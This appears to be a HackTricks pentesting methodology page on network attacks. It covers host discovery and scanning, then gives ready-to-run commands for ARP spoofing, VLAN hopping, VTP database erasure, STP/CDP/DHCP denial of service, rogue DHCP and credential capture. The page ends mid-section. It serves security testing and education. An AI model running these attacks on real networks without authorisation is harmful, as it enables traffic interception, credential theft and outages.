# Network Hacking

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Discovering hosts from the outside

This is going to be a **brief section** about how to find **IPs responding** from the **Internet**.\
In this situation you have some **scope of IPs** (maybe even several **ranges**) and you just to find **which IPs are responding**.

### ICMP

This is the **easiest** and **fastest** way to discover if a host is up or not.\
You could try to send some **ICMP** packets and **expect responses**. The easiest way is just sending an **echo request** and expect from the response. You can do that using a simple `ping`or using `fping`for **ranges**.\
You could also use **nmap** to send other types of ICMP packets (this will avoid filters to common ICMP echo request-response).

```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```

### TCP Port Discovery

It's very common to find that all kind of ICMP packets are being filtered. Then, all you can do to check if a host is up is **try to find open ports**. Each host has **65535 ports**, so, if you have a "big" scope you **cannot** test if **each port** of each host is open or not, that will take too much time.\
Then, what you need is a **fast port scanner** ([masscan](https://github.com/robertdavidgraham/masscan)) and a list of the **ports more used:**

```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```

You could also perform this step with `nmap`, but it slower and somewhat `nmap`has problems identifying hosts up.

### HTTP Port Discovery

This is just a TCP port discovery useful when you want to **focus on discovering HTTP** **services**:

```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```

### UDP Port Discovery

You could also try to check for some **UDP port open** to decide if you should **pay more attention** to a **host.** As UDP services usually **don't respond** with **any data** to a regular empty UDP probe packet it is difficult to say if a port is being filtered or open. The easiest way to decide this is to send a packet related to the running service, and as you don't know which service is running, you should try the most probable based on the port number:

```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```

The nmap line proposed before will test the **top 1000 UDP ports** in every host inside the **/24** range but even only this will take **>20min**. If need **fastest results** you can use [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner): `./udp-proto-scanner.pl 199.66.11.53/24` This will send these **UDP probes** to their **expected port** (for a /24 range this will just take 1 min): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP Port Discovery

```bash
#Probably useless, but it's pretty fast, why not trying?
nmap -T4 -sY -n --open -Pn <IP/range>
```

## Pentesting Wifi

Here you can find a nice guide of all the well known Wifi attacks at the time of the writing:

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## Discovering hosts from the inside

If you are inside the network one of the first things you will want to do is to **discover other hosts**. Depending on **how much noise** you can/want to do, different actions could be performed:

### Passive

You can use these tools to passively discover hosts inside a connected network:

```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```

### Active

Note that the techniques commented in [_**Discovering hosts from the outside**_](./#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP Port Discovery_) can be also **applied here**.\
But, as you are in the **same network** as the other hosts, you can do **more things**:

```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```

### Active ICMP

Note that the techniques commented in _Discovering hosts from the outside_ ([_**ICMP**_](./#icmp)) can be also **applied here**.\
But, as you are in the **same network** as the other hosts, you can do **more things**:

* If you **ping** a **subnet broadcast address** the ping should be arrive to **each host** and they could **respond** to **you**: `ping -b 10.10.5.255`
* Pinging the **network broadcast address** you could even find hosts inside **other subnets**: `ping -b 255.255.255.255`
* Use the `-PE`, `-PP`, `-PM` flags of `nmap`to perform host discovery sending respectively **ICMPv4 echo**, **timestamp**, and **subnet mask requests:** `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan is used to **turn on** computers through a **network message**. The magic packet used to turn on the computer is only a packet where a **MAC Dst** is provided and then it is **repeated 16 times** inside the same paket.\
Then this kind of packets are usually sent in an **ethernet 0x0842** or in a **UDP packet to port 9**.\
If **no \[MAC]** is provided, the packet is sent to **broadcast ethernet** (and the broadcast MAC will be the one being repeated).

```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```

## Scanning Hosts

Once you have discovered all the IPs (external or internal) you want to scan in depth, different actions can be performed.

### TCP

* **Open** port: _SYN --> SYN/ACK --> RST_
* **Closed** port: _SYN --> RST/ACK_
* **Filtered** port: _SYN --> \[NO RESPONSE]_
* **Filtered** port: _SYN --> ICMP message_

```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP> 
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP> 
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```

### UDP

There are 2 options to scan an UDP port:

* Send a **UDP packet** and check for the response _**ICMP unreachable**_ if the port is **closed** (in several cases ICMP will be **filtered** so you won't receive any information inf the port is close or open).
* Send a **formatted datagrams** to elicit a response from a **service** (e.g., DNS, DHCP, TFTP, and others, as listed in _nmap-payloads_). If you receive a **response**, then, the port is **open**.

**Nmap** will **mix both** options using "-sV" (UDP scans are very slow), but notice that UDP scans are slower than TCP scans:

```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP> 
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP> 
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```

### SCTP Scan

SCTP sits alongside TCP and UDP. Intended to provide **transport** of **telephony** data over **IP**, the protocol duplicates many of the reliability features of Signaling System 7 (SS7), and underpins a larger protocol family known as SIGTRAN. SCTP is supported by operating systems including IBM AIX, Oracle Solaris, HP-UX, Linux, Cisco IOS, and VxWorks.

Two different scans for SCTP are offered by nmap: _-sY_ and _-sZ_

```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```

### IDS and IPS evasion

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **More nmap options**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### Revealing Internal IP Addresses

Misconfigured routers, firewalls, and network devices sometimes **respond** to network probes **using nonpublic source addresses**. You can use _tcpdump_ used to **identify packets** received from **private addresses** during testing. In this case, the _eth2_ interface in Kali Linux is **addressable** from the **public Internet** (If you are **behind** a **NAT** of a **Firewall** this kind of packets are probably going to be **filtered**).

```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```

## Sniffing

Sniffing you can learn details of IP ranges, subnet sizes, MAC addresses, and hostnames by reviewing captured frames and packets. If the network is misconfigured or switching fabric under stress, attackers can capture sensitive material via passive network sniffing.

If a switched Ethernet network is configured properly, you will only see broadcast frames and material destined for your MAC address.

### TCPDump

```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```

One can, also, capture packets from a remote machine over an SSH session with Wireshark as the GUI in realtime.

```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```

### Bettercap

```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```

### Wireshark

Obviously.

### Capturing credentials

You can use tools like [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) to parse credentials from a pcap or a live interface.

## LAN attacks

### ARP spoofing

ARP Spoofing consist on sending gratuitous ARPResponses to indicate that the IP of a machine has the MAC of our device. Then, the victim will change the ARP table and will contact our machine every time it wants to contact the IP spoofed.

#### **Bettercap**

```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```

#### **Arpspoof**

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```

### MAC Flooding - CAM overflow

Overflow the switch’s CAM table sending a lot of packets with different source mac address. When the CAM table is full the switch start behaving like a hub (broadcasting all the traffic).

```bash
macof -i <interface>
```

In modern switches this vulnerability has been fixed.

### 802.1Q VLAN / DTP Attacks

#### Dynamic Trunking

**DTP (Dynamic Trunking Protocol)** is a link layer protocol designed to provide an automatic trunking system. With DTP, switches decide which port will work in trunk mode (Trunk) and which will not. The use of **DTP** indicates **poor network design.** **Trunks should be strictly** where they are needed, and it should be documented.

**By default, all switch ports operate in Dynamic Auto mode.** This indicates that the switch port is in trunk initiation mode from the neighbouring switch. **The Pentester needs to physically connect to the switch and send a DTP Desirable frame**, which triggers the port to switch to trunk mode. The attacker can then enumerate VLANs using STP frame analysis and bypass VLAN segmentation by creating virtual interfaces.

Many switches support the Dynamic Trunking Protocol (DTP) by default, however, which an adversary can abuse to **emulate a switch and receive traffic across all VLANs**. The tool [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) can sniff an interface and **reports if switch is in Default mode, trunk, dynamic, auto or access mode** (this is the only one that would avoid VLAN hopping). The tool will indicate if the switch is vulnerable or not.

If it was discovered that the the network is vulnerable, you can use _**Yersinia**_ to launch an "**enable trunking**" using protocol "**DTP**" and you will be able to see network packets from all the VLANs.

```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```

![](<../../.gitbook/assets/image (646) (1).png>)

To enumerate the VLANs it's also possible to generate the DTP Desirable frame with the script [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. D**o not interrupt the script under any circumstances. It injects DTP Desirable every three seconds. **The dynamically created trunk channels on the switch only live for five minutes. After five minutes, the trunk falls off.**

```
sudo python3 DTPHijacking.py --interface eth0
```

I would like to point out that **Access/Desirable (0x03)** indicates that the DTP frame is of the Desirable type, which tells the port to switch to Trunk mode. And **802.1Q/802.1Q (0xa5**) indicates the **802.1Q** encapsulation type.

By analyzing the STP frames, **we learn about the existence of VLAN 30 and VLAN 60.**

<figure><img src="../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

#### Attacking specific VLANs

Once you known VLAN IDs and IPs values, you can **configure a virtual interface to attack a specific VLAN**.\
If DHCP is not available, then use _ifconfig_ to set a static IP address.

```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
          inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
          inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:19 errors:0 dropped:0 overruns:0 frame:0
          TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```

#### Automatic VLAN Hopper

The discussed attack of **Dynamic Trunking and creating virtual interfaces an discovering hosts inside** other VLANs are **automatically performed** by the tool: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double Tagging

If an attacker knows the value of the **MAC, IP and VLAN ID of the victim host**, he could try to **double tag a frame** with its designated VLAN and the VLAN of the victim and send a packet. As the **victim won't be able to connect back** with the attacker, so the **best option for the attacker is communicate via UDP** to protocols that can perform some interesting actions (like SNMP).

Another option for the attacker is to launch a **TCP port scan spoofing an IP controlled by the attacker and accessible by the victim** (probably through internet). Then, the attacker could sniff in the second host owned by him if it receives some packets from the victim.

![](<../../.gitbook/assets/image (635) (1).png>)

To perform this attack you could use scapy: `pip install scapy`

```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```

#### Lateral VLAN Segmentation Bypass <a href="#d679" id="d679"></a>

If you have **access to a switch that you are directly connected to**, you have the ability to **bypass VLAN segmentation** within the network. Simply **switch the port to trunk mode** (otherwise known as trunk), create virtual interfaces with the IDs of the target VLANs, and configure an IP address. You can try requesting the address dynamically (DHCP) or you can configure it statically. It depends on the case.

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### Layer 3 Private VLAN Bypass

In guest wireless networks and other environments, private VLAN (also known as _port isolation_) settings are used to **prevent peers from interacting** (i.e., clients **connect to a wireless access point but cannot address one another**). Depending on network ACLs (or lack thereof), it might be possible to send IP packets up to a router, which are then forwarded back to a neighbouring peer.

This attack will send a **specially crafted packet to the IP of a client but with the MAC of the router**. Then, the **router will redirect the packet to the client**. As in _Double Tagging Attacks_ you can exploit this vulnerability by controlling a host accessible by the victim.

### VTP Attacks

**VTP (VLAN Trunking Protocol)** is a protocol designed to centrally manage VLANs. To keep track of the current VLAN database, switches check special revision numbers. When any table update occurs, the revision number is incremented by one. And if a switch detects a configuration with a higher revision number, it will automatically update its VLAN database.

#### Roles in a VTP domain <a href="#ebfc" id="ebfc"></a>

* **VTP Server.** A switch in the VTP Server role can create new VLANs, delete old ones, or change information in the VLANs themselves. **It also generates VTP announcements for the rest of the domain members.**
* **VTP Client.** A switch in this role will receive specific VTP announcements from other switches in the domain to update the VLAN databases on its own. Clients are limited in their ability to create VLANs and are not even allowed to change the VLAN configuration locally. In other words, **read only access.**
* **VTP Transparent.** In this mode, the switch does not participate in VTP processes and can host full and local administration of the entire VLAN configuration. When operating in transparent mode, switches only transmit VTP announcements from other switches without affecting their VLAN configuration. **Such switches will always have a revision number of zero and cannot be attacked.**

#### Advertisement types <a href="#b384" id="b384"></a>

* **Summary Advertisement —** the VTP announcement that the VTP server sends every **300 seconds (5 minutes).** This announcement stores the VTP domain name, protocol version, timestamp, and MD5 configuration hash value.
* **Subset Advertisement —** this is the VTP advertisement that is sent whenever a VLAN configuration change occurs.
* **Advertisement Request —** is a request from the VTP client to the VTP server for a Summary Advertisement message. Usually sent in response to a message that a switch has detected a Summary Advertisement with a higher configuration revision number.

VTP can **only be attacked from a trunk port,** because **VTP announcements are only broadcast and received on trunk ports.** **Therefore, when pentesting after attacking DTP, your next target could be VTP.** To attack the VTP domain you can **use Yersinia** to **run a VTP inject that will erase the entire VLAN** **database** and thus paralyze the network.

{% hint style="info" %}
The VTP protocol has as many as **three versions**. In this post the attack is against the first version, VTPv1
{% endhint %}

```bash
yersinia -G #For graphic mode
```

To erase the entire VLAN database, select the **deleting all VTP vlans** option

<figure><img src="../../.gitbook/assets/image (22) (2).png" alt=""><figcaption></figcaption></figure>

### STP Attacks

**If you cannot capture BPDU frames on your interfaces, it is unlikely that you will succeed in an STP attack.**

#### **STP BPDU DoS**

Sending a lot of BPDUs TCP (Topology Change Notification) or Conf (the BPDUs that are sent when the topology is created) the switches are overloaded and stop working correctly.

```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```

#### **STP TCP Attack**

When a TCP is sent, the CAM table of the switches will be deleted in 15s. Then, if you are sending continuously this kind of packets, the CAM table will be restarted continuously (or every 15segs) and when it is restarted, the switch behaves as a hub

```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```

#### **STP Root Attack**

The attacker simulates the behaviour of a switch to become the STP root of the network. Then, more data will pass through him. This is interesting when you are connected to two different switches.\
This is done by sending BPDUs CONF packets saying that the **priority** value is less than the actual priority of the actual root switch.

```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```

**If the attacker is connected to 2 switches he can be the root of the new tree and all the traffic between those switches will pass through him** (a MITM attack will be performed).

```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```

### CDP Attacks

CISCO Discovery Protocol is the protocol used by CISCO devices to talk among them, **discover who is alive** and what features does they have.

#### Information Gathering <a href="#0e0f" id="0e0f"></a>

**By default, the CDP sends announcements to all its ports.** But what if an intruder connects to a port on the same switch? Using a network sniffer, be it **Wireshark,** **tcpdump** or **Yersinia**, he could extract **valuable information about the device itself**, from its model to the Cisco IOS version. Using this information he will be able to enumerate the same version of Cisco IOS and find the vulnerability and then exploit it.

#### CDP Flooding Attack <a href="#0d6a" id="0d6a"></a>

You can make a DoS attack to a CISCO switch by exhausting the device memory simulating real CISCO devices.

```bash
sudo yersinia cdp -attack 1 #DoS Attack simulating new CISCO devices
# Or you could use the GUI
sudo yersinia -G
```

Select the **flooding CDP table** option and start the attack. The switch CPU will be overloaded, as well as the CDP neighbor table, **resulting in “network paralysis”.**

<figure><img src="../../.gitbook/assets/image (1) (5) (1).png" alt=""><figcaption></figcaption></figure>

#### CDP Impersonation Attack

```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```

You could also use [**scapy**](https://github.com/secdev/scapy/). Be sure to install it with `scapy/contrib` package.

### VoIP Attacks

Although intended for use by the employees’ Voice over Internet Protocol (VoIP) phones, modern VoIP devices are increasingly integrated with IoT devices. Many employees can now unlock doors using a special phone number, control the room’s thermostat...

The tool [**voiphopper**](http://voiphopper.sourceforge.net) mimics the behavior of a VoIP phone in Cisco, Avaya, Nortel, and Alcatel-Lucent environments. It automatically discovers the correct VLAN ID for the voice network using one of the device discovery protocols it supports, such as the Cisco Discovery Protocol (CDP), the Dynamic Host Configuration Protocol (DHCP), Link Layer Discovery Protocol Media Endpoint Discovery (LLDP-MED), and 802.1Q ARP.

**VoIP Hopper** supports **three** CDP modes. The **sniff** mode inspects the network packets and attempts to locate the VLAN ID. To use it, set the **`-c`** parameter to `0`. The **spoof** mode generates custom packets similar to the ones a real VoIP device would transmit in the corporate network. To use it, set the **`-c`** parameter to **`1`**. The spoof with a **pre-madepacket** mode sends the same packets as a Cisco 7971G-GE IP phone. To use it, set the **`-c`** parameter to **`2`**.

We use the last method because it’s the fastest approach. The **`-i`** parameter specifies the attacker’s **network** **interface**, and the **`-E`** parameter specifies the **name of the VOIP device** being imitated. We chose the name SEP001EEEEEEEEE, which is compatible with the Cisco naming format for VoIP phones. The format consists of the word “SEP” followed by a MAC address. In corporate environments, you can imitate an existing VoIP device by looking at the MAC label on the back of the phone; by pressing the Settings button and selecting the Model Information option on the phone’s display screen; or by attaching the VoIP device’s Ethernet cable to your laptop and observing the device’s CDP requests using Wireshark.

```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```

If the tool executes successfully, the **VLAN network will assign an IPv4 address to the attacker’s device**.

### DHCP Attacks

#### Enumeration

```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover: 
|   Response 1 of 1: 
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```

**DoS**

**Two types of DoS** could be performed against DHCP servers. The first one consists on **simulate enough fake hosts to use all the possible IP addresses**.\
This attack will work only if you can see the responses of the DHCP server and complete the protocol (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)). For example, this is **not possible in Wifi networks**.

Another way to perform a DHCP DoS is to send a **DHCP-RELEASE packet using as source code every possible IP**. Then, the server will think that everybody has finished using the IP.

```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```

A more automatic way of doing this is using the tool [DHCPing](https://github.com/kamorin/DHCPig)

You could use the mentioned DoS attacks to force clients to obtain new leases within the environment, and exhaust legitimate servers so that they become unresponsive. So when the legitimate try to reconnect, **you can server malicious values mentioned in the next attack**.

#### Set malicious values

You can use Responder DHCP script (_/usr/share/responder/DHCP.py_) to establish a rogue DHCP server. Setting a malicious gateway is not ideal, because the hijacked connection is only half-duplex (i.e., we capture egress packets from the client, but not the responses from the legitimate gateway). As such, I would recommend setting a rogue DNS or WPAD server to capture HTTP traffic and credentials in particular.

| Description                                 | Example                                                                      |
| ------------------------------------------- | ---------------------------------------------------------------------------- |
| Our IP address, advertised as a gateway     | _-i 10.0.0.100_                                                              |
| The local DNS domain name (optional)        | _-d example.org_                                                             |
| IP address of the original router/gateway   | _-r 10.0.0.1_                                                                |
| Primary DNS server IP address               | _-p 10.0.0.100_                                                              |
| Secondary DNS server IP address (optional)  | _-s 10.0.0.1_                                                                |
| The netmask of the local network            | _-n 255.255.255.0_                                                           |
| The interface to listen for DHCP traffic on | _-I eth1_                                                                    |
| WPAD configuration address (URL)            | _-w “_[http://10.0.0.100/wpad.dat\n”](http://10.0.0.100/wpad.dat/n%E2%80%9D) |
| Spoof the default gateway IP address        | -S                                                                           |
| Respond to all DHCP requests (very noisy)   | -R                                                                           |

### **EAP Attacks**

Here are some of the attack tactics that can be used against 802.1X implementations:

* Active brute-force password grinding via EAP
* Attacking the RADIUS server with malformed EAP content _\*\*_(exploits)
* EAP message capture and offline password cracking (EAP-MD5 and PEAP)
* Forcing EAP-MD5 authentication to bypass TLS certificate validation
* Injecting malicious network traffic upon authenticating using a hub or similar

If the attacker if between the victim and the authentication server, he could try to degrade (if necessary) the authentication protocol to EAP-MD5 and capture the authentication attempt. Then, he could brute-force this using:

```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```

### FHRP (GLBP & HSRP) Attacks <a href="#6196" id="6196"></a>

**FHRP** (First Hop Redundancy Protocol) is a class of network protocols designed to **create a hot redundant routing system**. With FHRP, physical routers can be combined into a single logical device, which increases fault tolerance and helps distribute the load.

**Cisco Systems engineers have developed two FHRP protocols, GLBP and HSRP.**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

Three versions of the Routing Information Protocol (RIP) exist—RIP, RIPv2, and RIPng. RIP and RIPv2 use UDP datagrams sent to peers via port 520, whereas RIPng broadcasts datagrams to UDP port 521 via IPv6 multicast. RIPv2 introduced MD5 authentication support. RIPng does not incorporate native authentication; rather, it relies on optional IPsec AH and ESP headers within IPv6.

For more information about how to attack this protocol go to the book _**Network Security Assessment: Know Your Network (3rd edition).**_

### EIGRP Attacks

**EIGRP (Enhanced Interior Gateway Routing Protocol)** is a dynamic routing protocol. **It is a distance-vector protocol.** If there is **no authentication** and configuration of passive interfaces, an **intruder** can interfere with EIGRP routing and cause **routing tables poisoning**. Moreover, EIGRP network (in other words, autonomous system) **is flat and has no segmentation into any zones**. If an **attacker injects a route**, it is likely that this route will **spread** throughout the autonomous EIGRP system.

To attack a EIGRP system requires **establishing a neighbourhood with a legitimate EIGRP route**r, which opens up a lot of possibilities, from basic reconnaissance to various injections.

\*\*\*\*[**FRRouting**](https://frrouting.org/) allows you to implement **a virtual router that supports BGP, OSPF, EIGRP, RIP and other protocols.** All you need to do is deploy it on your attacker’s system and you can actually pretend to be a legitimate router in the routing domain.

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

\*\*\*\*[**Coly**](https://code.google.com/p/coly/) also supports capture of EIGRP broadcasts and injection of packets to manipulate routing configuration. For more info about how to attack it with Coly check _**Network Security Assessment: Know Your Network (3rd edition).**_

### OSPF

Most Open Shortest Path First (OSPF) implementations use MD5 to provide authentication between routers. Loki and John the Ripper can capture and attack MD5 hashes to reveal the key, which can then be used to advertise new routes. The route parameters are set by using the _Injection_ tab, and the key set under _Connection_.

For more information about how to attack this protocol go to the book _**Network Security Assessment: Know Your Network (3rd edition).**_

### Other Generic Tools & Sources

* [**Above**](https://github.com/c4s73r/Above): Tool to scan network traffic and find vulnerabilities
* You can find some more information about network attacks [here](https://github.com/Sab0tag3d/MITM-cheatsheet). _(TODO: Read it all and all new attacks if any)_

## **Spoofing**

The attacker configures all the network parameters (GW, IP, DNS) of the new member of the network sending fake DHCP responses.

```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```

### ARP Spoofing

Check the [previous section](./#arp-spoofing).

### ICMPRedirect

ICMP Redirect consist on sending an ICMP packet type 1 code 5 that indicates that the attacker is the best way to reach an IP. Then, when the victim wants to contact the IP, it will send the packet through the attacker.

```bash
Ettercap
icmp_redirect
